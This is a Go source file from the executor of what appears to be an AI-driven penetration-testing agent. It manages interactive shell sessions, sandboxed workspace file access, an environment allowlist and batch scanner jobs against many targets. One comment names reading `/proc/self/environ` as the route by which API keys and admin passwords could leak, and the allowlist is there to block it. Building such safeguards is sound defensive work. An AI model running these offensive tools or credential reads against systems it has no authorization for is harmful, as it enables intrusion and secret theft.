// 覆盖 mysql/redis-cli/ssh -T/nc 监听/长驻脚本类交互场景（strrix PTY shell、CAI ShellSession、
// BoxPwnr pty_manager 的无依赖实现）；无 TTY——交互式 readline 工具（msfconsole）仍建议
// run_command -x 脚本化，Python 类用 -u 关闭缓冲。
type ShellSession struct {
	ID        string
	Command   string
	StartedAt time.Time
	Timeout   time.Duration

	mu      sync.Mutex
	stdin   io.WriteCloser
	buf     []byte
	readOff int
	closed  bool
	done    chan struct{}
	cmd     *exec.Cmd
}

const (
	sessionBufferCap     = 256 << 10 // 单会话输出累积上限（超限丢弃最旧一半，读偏移同步回退）
	sessionReadMax       = 8 << 10   // 单次 shell_read 返回上限
	sessionMaxPerProject = 8         // 每项目并存会话上限
)

func (s *ShellSession) alive() bool {
	select {
	case <-s.done:
		return false
	default:
		return true
	}
}

// StartShell 启动持久交互会话（审批与证据链由编排层完成；此处只负责进程与管道）。
func (e *Executor) StartShell(projectID, command string, timeoutSec int) (*ShellSession, error) {
	command = strings.TrimSpace(command)
	if command == "" {
		return nil, fmt.Errorf("命令为空")
	}
	if timeoutSec <= 0 {
		timeoutSec = int(e.asyncTimeout.Seconds())
	}
	if e.asyncHardCap > 0 && time.Duration(timeoutSec)*time.Second > e.asyncHardCap {
		timeoutSec = int(e.asyncHardCap.Seconds())
	}
	e.sessMu.Lock()
	if e.sessions[projectID] == nil {
		e.sessions[projectID] = map[string]*ShellSession{}
	}
	live := 0
	for _, ss := range e.sessions[projectID] {
		if ss.alive() {
			live++
		}
	}
	if live >= sessionMaxPerProject {
		e.sessMu.Unlock()
		return nil, fmt.Errorf("交互会话数已达上限（%d），请先 shell_close 释放不用的会话", sessionMaxPerProject)
	}
	id, err := newJobID()
	if err != nil {
		e.sessMu.Unlock()
		return nil, err
	}
	sess := &ShellSession{
		ID: id, Command: truncate(command, 300),
		StartedAt: time.Now(), Timeout: time.Duration(timeoutSec) * time.Second,
		done: make(chan struct{}),
		cmd:  exec.Command("bash", "-lc", command),
	}
	sess.cmd.Dir = e.workspaceDir(projectID)
	sess.cmd.Env = append(append(sanitizeEnv(os.Environ()), "JIUTOUNIAO=1", "LANG=C.UTF-8"), e.extraEnvSlice()...)
	sess.cmd.SysProcAttr = &syscall.SysProcAttr{Setpgid: true} // 进程组：超时/熔断整组终止
	sess.cmd.WaitDelay = 10 * time.Second                      // v3.7.6：逃逸孙进程兜底
	if sess.stdin, err = sess.cmd.StdinPipe(); err != nil {
		e.sessMu.Unlock()
		return nil, err
	}
	stdout, err := sess.cmd.StdoutPipe()
	if err != nil {
		e.sessMu.Unlock()
		return nil, err
	}
	sess.cmd.Stderr = sess.cmd.Stdout // stderr 并入同一管道，读侧统一收
	if err := sess.cmd.Start(); err != nil {
		e.sessMu.Unlock()
		return nil, err
	}
	e.sessions[projectID][id] = sess
	e.sessMu.Unlock()

	go func() { // 输出累积（带环形上限）
		defer stdout.Close()
		chunk := make([]byte, 8192)
		for {
			n, err := stdout.Read(chunk)
			if n > 0 {
				sess.mu.Lock()
				sess.buf = append(sess.buf, chunk[:n]...)
				if len(sess.buf) > sessionBufferCap {
					dropped := len(sess.buf) - sessionBufferCap/2
					sess.buf = sess.buf[dropped:]
					if sess.readOff > dropped {
						sess.readOff -= dropped
					} else {
						sess.readOff = 0
					}
				}
				sess.mu.Unlock()
			}
			if err != nil {
				return
			}
		}
	}()
	go func() {
		_ = sess.cmd.Wait()
		close(sess.done)
	}()
	time.AfterFunc(sess.Timeout, func() { e.CloseShell(projectID, id) })
	return sess, nil
}

// WriteShell 向会话注入输入（enter=true 自动补换行）。
func (e *Executor) WriteShell(projectID, sessionID, input string, enter bool) error {
	e.sessMu.Lock()
	sess := e.sessions[projectID][sessionID]
	e.sessMu.Unlock()
	if sess == nil {
		return fmt.Errorf("未知会话 id")
	}
	if !sess.alive() {
		return fmt.Errorf("会话已结束（进程退出）")
	}
	if enter && !strings.HasSuffix(input, "\n") {
		input += "\n"
	}
	_, err := io.WriteString(sess.stdin, input)
	return err
}

// ReadShell 增量读取自上次读取后的新输出（至多 sessionReadMax）。
func (e *Executor) ReadShell(projectID, sessionID string) (string, bool) {
	e.sessMu.Lock()
	sess := e.sessions[projectID][sessionID]
	e.sessMu.Unlock()
	if sess == nil {
		return "", false
	}
	sess.mu.Lock()
	defer sess.mu.Unlock()
	if sess.readOff >= len(sess.buf) {
		return "", true
	}
	end := sess.readOff + sessionReadMax
	if end > len(sess.buf) {
		end = len(sess.buf)
	}
	out := string(sess.buf[sess.readOff:end])
	sess.readOff = end
	return out, true
}

// CloseShell 终止会话（进程组级），注册保留供事后 read（返回已结束状态）。
func (e *Executor) CloseShell(projectID, sessionID string) bool {
	e.sessMu.Lock()
	sess := e.sessions[projectID][sessionID]
	e.sessMu.Unlock()
	if sess == nil {
		return false
	}
	if sess.alive() {
		_ = sess.stdin.Close()
		if sess.cmd.Process != nil {
			killGroup(sess.cmd.Process.Pid)
		}
	}
	return true
}

// KillAllSessions 终止项目全部交互会话（熔断/流水线结束时调用），返回终止数。
func (e *Executor) KillAllSessions(projectID string) int {
	e.sessMu.Lock()
	ss := e.sessions[projectID]
	e.sessMu.Unlock()
	n := 0
	for id := range ss {
		e.sessMu.Lock()
		sess := ss[id]
		e.sessMu.Unlock()
		if sess != nil && sess.alive() {
			n++
		}
		e.CloseShell(projectID, id)
	}
	return n
}

// tailFile 读文件尾部（后台任务增量收结果用，不整量回传）。
func tailFile(path string, max int) string {
	b, err := os.ReadFile(path)
	if err != nil {
		return "(暂无输出)"
	}
	return tailString(string(b), max)
}

func tailString(s string, max int) string {
	if len(s) <= max {
		return s
	}
	s = s[len(s)-max:]
	if i := strings.IndexByte(s, '\n'); i >= 0 {
		s = s[i+1:]
	}
	return "…(仅输出尾部)\n" + s
}

// WriteFile 在项目工作区内写文件（拒绝路径逃逸）；返回绝对路径。
func (e *Executor) WriteFile(projectID, relPath, content string) (string, error) {
	clean := filepath.Clean("/" + relPath)[1:] // 去掉开头的 /
	if clean == "" || clean == "." {
		return "", fmt.Errorf("非法路径")
	}
	full := filepath.Join(e.workspaceDir(projectID), clean)
	if !strings.HasPrefix(full, filepath.Clean(e.workspaceDir(projectID))+string(filepath.Separator)) {
		return "", fmt.Errorf("路径越界")
	}
	if err := os.MkdirAll(filepath.Dir(full), 0o750); err != nil {
		return "", err
	}
	if err := os.WriteFile(full, []byte(content), 0o640); err != nil {
		return "", err
	}
	return full, nil
}

// ReadFile 读取项目工作区内文件。
func (e *Executor) ReadFile(projectID, relPath string) (string, error) {
	clean := filepath.Clean("/" + relPath)[1:]
	full := filepath.Join(e.workspaceDir(projectID), clean)
	if !strings.HasPrefix(full, filepath.Clean(e.workspaceDir(projectID))+string(filepath.Separator)) {
		return "", fmt.Errorf("路径越界")
	}
	b, err := os.ReadFile(full)
	if err != nil {
		return "", err
	}
	return truncate(string(b), e.maxOut), nil
}

// ListDir v3.8.5 列出项目工作区内相对目录下的文件（返回工作区相对路径，沙箱内）。
// 供引擎确定性质量门扫描 evidence/ 证据目录使用；目录不存在返回空列表而非错误。
func (e *Executor) ListDir(projectID, relPath string) ([]string, error) {
	clean := filepath.Clean("/" + relPath)[1:]
	root := filepath.Join(e.workspaceDir(projectID), clean)
	if !strings.HasPrefix(root, filepath.Clean(e.workspaceDir(projectID))+string(filepath.Separator)) {
		return nil, fmt.Errorf("路径越界")
	}
	var out []string
	err := filepath.WalkDir(root, func(p string, d fs.DirEntry, err error) error {
		if err != nil || d.IsDir() {
			return nil
		}
		rel, rerr := filepath.Rel(e.workspaceDir(projectID), p)
		if rerr != nil {
			return nil
		}
		out = append(out, filepath.ToSlash(rel))
		return nil
	})
	if err != nil && os.IsNotExist(err) {
		return nil, nil
	}
	return out, err
}

// KillAll 一键熔断：杀死该项目所有运行中的进程（含 v2.6 后台任务与 v3.3.0 交互会话，进程组级）。
func (e *Executor) KillAll(projectID string) {
	e.mu.Lock()
	cmd := e.runnings[projectID]
	e.mu.Unlock()
	if cmd != nil && cmd.Process != nil {
		_ = cmd.Process.Kill()
	}
	e.KillAllAsync(projectID)
	e.KillAllSessions(projectID)
}

func (e *Executor) workspaceDir(projectID string) string {
	d := filepath.Join(e.workspace, projectID)
	_ = os.MkdirAll(d, 0o750)
	return d
}

// sanitizeEnv v3.2.0 子进程环境变量白名单：只放行工具运行所必需的安全键，
// 阻断 LLM_API_KEY / ADMIN_PASSWORD / AUTH_TOKEN / admin_password_hash 等
// 容器环境密钥经 `env`/`cat /proc/self/environ` 泄漏进智能体上下文与证据库。
// 测绘 Key（FOFA_KEY 等）走 extraEnv 显式注入不受影响；代理变量天然不在白名单
// （原 stripProxyEnv 语义被覆盖：目标主机流量直连保证继续成立）。
var safeEnvKeys = map[string]bool{
	"PATH": true, "HOME": true, "SHELL": true, "USER": true, "LOGNAME": true,
	"TERM": true, "LANG": true, "LC_ALL": true, "LC_CTYPE": true, "TZ": true,
	"TMPDIR": true, "HOSTNAME": true, "PWD": true, "SHLVL": true,
	"PYTHONUNBUFFERED": true, "PYTHONIOENCODING": true, "GOMAXPROCS": true,
	"DEBIAN_FRONTEND": true, "NO_COLOR": true,
	// v3.4.2 修复（v3.2.0 引入的回归）：TOOL_PROXY 是工具下载代理地址（非密钥），
	// loop-core 与上下文包都教智能体用 `env http_proxy=$TOOL_PROXY <cmd>` 前缀——
	// v3.2.0 白名单误杀后该模式静默失效（$TOOL_PROXY 展开为空，外网下载悄悄直连）。
	"TOOL_PROXY": true,
}

func sanitizeEnv(env []string) []string {
	out := make([]string, 0, len(env))
	for _, kv := range env {
		i := strings.IndexByte(kv, '=')
		if i <= 0 || !safeEnvKeys[kv[:i]] {
			continue
		}
		out = append(out, kv)
	}
	return out
}

// TruncateSmart 供编排层溢出回执使用（head+tail 智截断，rune 边界安全）。
func TruncateSmart(s string, n int) string { return truncate(s, n) }

// truncate v3.3.0 智截断：超限时保留头部 70% + 尾部 30%（错误/统计常在尾部，纯头部截断
// 曾把 sqlmap 汇总、报错堆栈整体截丢），rune 边界安全（v3.2 前字节截断会劈碎多字节中文）。
func truncate(s string, n int) string {
	if len(s) <= n {
		return s
	}
	head := n * 7 / 10
	tail := n - head
	hi := safeCut(s, head)
	lo := safeCut(s, len(s)-tail)
	if lo <= hi {
		return s[:hi] + "\n...(输出超限已截断)"
	}
	return s[:hi] + "\n…(中段已省略，全文见证据链/溢出文件)…\n" + s[lo:]
}

// safeCut 返回 ≤i 的最大 UTF-8 rune 边界位置。
func safeCut(s string, i int) int {
	if i >= len(s) {
		return len(s)
	}
	for i > 0 && (s[i]&0xC0) == 0x80 {
		i--
	}
	return i
}

// ---------- v6.0.1 P4/P2：日志观测 + 批量隔离（fix-plan 20261122） ----------

// AsyncLogStats v6.0.1 P4：返回作业日志实时字节数与最后输出时间（运行中即可查；
// 引擎重启后从 sidecar/日志文件兜底恢复）。ok=false 表示 job id 不存在。
func (e *Executor) AsyncLogStats(projectID, jobID string) (logBytes int64, lastOutputAt string, ok bool) {
	e.asyncMu.Lock()
	job := e.asyncJobs[projectID][jobID]
	e.asyncMu.Unlock()
	if job != nil {
		b, ts := jobObs(job)
		return b, ts, true
	}
	dir := e.workspaceDir(projectID)
	raw, err := os.ReadFile(filepath.Join(dir, ".async", "job-"+jobID+".json"))
	if err != nil {
		return 0, "", false
	}
	var sc asyncSidecar
	if json.Unmarshal(raw, &sc) != nil {
		return 0, "", false
	}
	lb, _ := realOutputBytes(filepath.Join(dir, sc.Log))
	return lb, sc.LastOutputAt, true
}

// realOutputBytes v6.0.1 P2：日志文件的实质输出字节数（剥离引擎追加的 [JT-JOB-END] 终态标记——
// 纯零输出任务的文件也会含 ~60B 标记，按原文件大小判断会误判为"有输出"）。
func realOutputBytes(path string) (int64, bool) {
	raw, err := os.ReadFile(path)
	if err != nil {
		return 0, false
	}
	if idx := bytes.Index(raw, []byte("\n[JT-JOB-END]")); idx >= 0 {
		return int64(idx), true
	}
	return int64(len(raw)), true
}

// IncompleteJob 未完成的后台作业（v6.0.1 P2 收口对账数据源）。
type IncompleteJob struct {
	ID       string `json:"id"`
	State    string `json:"state"`
	LogBytes int64  `json:"log_bytes"`
	Command  string `json:"command"`
}

// IncompleteAsyncJobs 扫描项目全部后台作业 sidecar，返回未完成项：
// ① state=killed（超时整组终止——产出不完整）；② finished 但日志近零产出（<32B，
// 即除 [JT-JOB-END] 标记外无实质输出）。判定只基于机器可读状态，不推断漏洞结论；
// 收口门据此要求逐条 VT/coverage 留痕（C31 零产出对账），禁止写成阴性结论。
func (e *Executor) IncompleteAsyncJobs(projectID string) []IncompleteJob {
	dir := filepath.Join(e.workspaceDir(projectID), ".async")
	entries, err := os.ReadDir(dir)
	if err != nil {
		return nil
	}
	var out []IncompleteJob
	for _, en := range entries {
		name := en.Name()
		if !strings.HasPrefix(name, "job-") || !strings.HasSuffix(name, ".json") {
			continue
		}
		raw, rerr := os.ReadFile(filepath.Join(dir, name))
		if rerr != nil {
			continue
		}
		var sc asyncSidecar
		if json.Unmarshal(raw, &sc) != nil || sc.State == "" {
			continue // running 中/无终态：由 S7 JT-JOB-END 门负责
		}
		lb, ok2 := realOutputBytes(filepath.Join(dir, sc.Log))
		if !ok2 {
			lb = sc.LogBytes
		}
		incomplete := sc.State == "killed" || lb < 32
		if !incomplete {
			continue
		}
		out = append(out, IncompleteJob{ID: sc.ID, State: sc.State, LogBytes: lb, Command: sc.Command})
	}
	sort.Slice(out, func(i, j int) bool { return out[i].ID < out[j].ID })
	return out
}

// ---------- v6.0.1 P2 批量任务逐目标隔离（fix-plan 20261122） ----------

// batchPlaceholder 批量命令模板中的目标占位符（替换为单引号安全引用的目标值）。
const batchPlaceholder = "{{TARGET}}"

// batchMaxTargets 单批目标上限（防一次投递打爆并发/预算；更多目标分多批）。
const batchMaxTargets = 100

// BatchTargetResult 单目标子任务（每目标独立进程组/超时/日志——单目标失败不取消其余）。
type BatchTargetResult struct {
	Target  string `json:"target"`
	JobID   string `json:"job_id"`
	Log     string `json:"log"`
	Command string `json:"command"`
	Err     string `json:"err,omitempty"` // 启动失败原因（不影响其余目标）
}

// BatchJob 批量任务聚合（模板 + 逐目标 job 清单；sidecar 落 .async/batch-<id>.json）。
type BatchJob struct {
	ID               string              `json:"id"`
	Template         string              `json:"template"`
	Targets          []BatchTargetResult `json:"targets"`
	StartedAt        time.Time           `json:"started_at"`
	PerTargetTimeout int                 `json:"per_target_timeout_sec"`
}

// quoteShellArg 单引号安全引用（' → '\''），目标值注入命令模板前的最后防线。
func quoteShellArg(s string) string {
	return "'" + strings.ReplaceAll(s, "'", `'\''`) + "'"
}

// StartBatch v6.0.1 P2（fix-plan 20261122）：批量任务逐目标隔离执行。
// 实证事故：nuclei 单进程批量中一个 403 慢响应主机耗尽整批预算（>5min 零产出），
// 已知漏洞三通道之一整通道失效。本方法把模板按 {{TARGET}} 拆成逐目标独立 bash 进程组
// （复用 StartAsync：独立超时/日志/sidecar/进程组终止），单目标失败/超时不影响其余，
// 聚合结果逐目标保留 job id。风险分级/审批/治理门由 orchestrator 工具层在拆分前后完成
//（模板与逐目标实例都过 ClassifyRisk，任一实例风险升级即拒绝整批）。
func (e *Executor) StartBatch(projectID, template string, targets []string, timeoutSec int) (*BatchJob, error) {
	template = strings.TrimSpace(template)
	if template == "" {
		return nil, fmt.Errorf("命令模板为空")
	}
	if !strings.Contains(template, batchPlaceholder) {
		return nil, fmt.Errorf("命令模板缺少 %s 占位符（模板中写 {{TARGET}}，由引擎逐目标替换并安全引用）", batchPlaceholder)
	}
	if len(targets) == 0 {
		return nil, fmt.Errorf("目标列表为空")
	}
	if len(targets) > batchMaxTargets {
		return nil, fmt.Errorf("目标数 %d 超过单批上限 %d——按组分多批投递", len(targets), batchMaxTargets)
	}
	if timeoutSec <= 0 {
		timeoutSec = int(e.asyncTimeout.Seconds())
	}
	bid, err := newJobID()
	if err != nil {
		return nil, err
	}
	batch := &BatchJob{ID: bid, Template: truncate(template, 500), StartedAt: time.Now(), PerTargetTimeout: timeoutSec}
	for _, t := range targets {
		t = strings.TrimSpace(t)
		if t == "" || strings.ContainsAny(t, "\n\r") {
			continue // 空行/多行值跳过（调用方传清单时的容错）
		}
		cmd := strings.ReplaceAll(template, batchPlaceholder, quoteShellArg(t))
		tr := BatchTargetResult{Target: t, Command: cmd}
		if job, err := e.StartAsync(projectID, cmd, timeoutSec); err == nil {
			tr.JobID, tr.Log = job.ID, job.LogPath
		} else {
			tr.Err = err.Error() // fail-continue：单目标启动失败不影响其余
		}
		batch.Targets = append(batch.Targets, tr)
	}
	if len(batch.Targets) == 0 {
		return nil, fmt.Errorf("无有效目标（全部为空行/多行值）")
	}
	dir := e.workspaceDir(projectID)
	if os.MkdirAll(filepath.Join(dir, ".async"), 0o750) == nil {
		if b, _ := json.Marshal(batch); b != nil {
			_ = os.WriteFile(filepath.Join(dir, ".async", "batch-"+batch.ID+".json"), b, 0o640)
		}
	}
	return batch, nil
}
